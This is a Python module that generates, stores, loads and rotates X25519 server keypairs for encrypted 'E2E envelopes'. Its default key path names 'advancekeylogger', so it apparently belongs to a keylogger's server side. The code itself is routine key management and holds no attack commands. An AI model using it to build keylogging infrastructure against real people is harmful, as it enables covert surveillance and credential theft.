"""Server-side key management for E2E envelopes."""
from __future__ import annotations

import base64
import logging
import time
from typing import Any

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import x25519

from crypto.key_store import KeyStore

logger = logging.getLogger(__name__)


def generate_server_keypair(key_store_path: str) -> str:
    """Generate and persist a server X25519 keypair; return base64 public key."""
    store = KeyStore(key_store_path)
    private_key = x25519.X25519PrivateKey.generate()
    public_key = private_key.public_key()

    _save_keys(store, private_key, public_key)
    store.save_json("server_meta", {"created_at": time.time()})

    public_bytes = public_key.public_bytes(
        serialization.Encoding.Raw, serialization.PublicFormat.Raw
    )
    return base64.b64encode(public_bytes).decode("utf-8")


def load_server_private_keys(config: dict[str, Any]) -> list[x25519.X25519PrivateKey]:
    """Load server private keys (current + previous) from config or keystore."""
    key_b64 = str(config.get("server_private_key", "")).strip()
    if key_b64:
        raw = base64.b64decode(key_b64.encode("utf-8"))
        return [x25519.X25519PrivateKey.from_private_bytes(raw)]

    key_store_path = str(config.get("key_store_path", "~/.advancekeylogger/keys/"))
    store = KeyStore(key_store_path)

    _maybe_rotate_keys(store, config)

    keys: list[x25519.X25519PrivateKey] = []
    current = store.load_bytes("server_x25519_private")
    if not current:
        logger.warning(
            "Server private key not found; auto-generating keypair in %s",
            key_store_path,
        )
        public_b64 = generate_server_keypair(key_store_path)
        logger.info("Generated server public key: %s", public_b64)
        current = store.load_bytes("server_x25519_private")
    if not current:
        raise ValueError("Failed to load or generate server keypair")
    keys.append(x25519.X25519PrivateKey.from_private_bytes(current))

    previous = store.load_bytes("server_x25519_private_prev")
    if previous:
        keys.append(x25519.X25519PrivateKey.from_private_bytes(previous))

    return keys


def _maybe_rotate_keys(store: KeyStore, config: dict[str, Any]) -> None:
    rotation_hours = config.get("key_rotation_hours")
    if not rotation_hours:
        return
    meta = store.load_json("server_meta") or {}
    created_at = float(meta.get("created_at", 0.0)) if meta else 0.0
    if not created_at:
        return
    age = time.time() - created_at
    if age < float(rotation_hours) * 3600:
        return

    current = store.load_bytes("server_x25519_private")
    public = store.load_bytes("server_x25519_public")
    if current and public:
        store.save_bytes("server_x25519_private_prev", current)
        store.save_bytes("server_x25519_public_prev", public)
    new_private = x25519.X25519PrivateKey.generate()
    new_public = new_private.public_key()
    _save_keys(store, new_private, new_public)
    store.save_json("server_meta", {"created_at": time.time()})
    logger.info("Rotated server keypair")


def _save_keys(
    store: KeyStore,
    private_key: x25519.X25519PrivateKey,
    public_key: x25519.X25519PublicKey,
) -> None:
    store.save_bytes(
        "server_x25519_private",
        private_key.private_bytes(
            serialization.Encoding.Raw,
            serialization.PrivateFormat.Raw,
            serialization.NoEncryption(),
        ),
    )
    store.save_bytes(
        "server_x25519_public",
        public_key.public_bytes(
            serialization.Encoding.Raw,
            serialization.PublicFormat.Raw,
        ),
    )
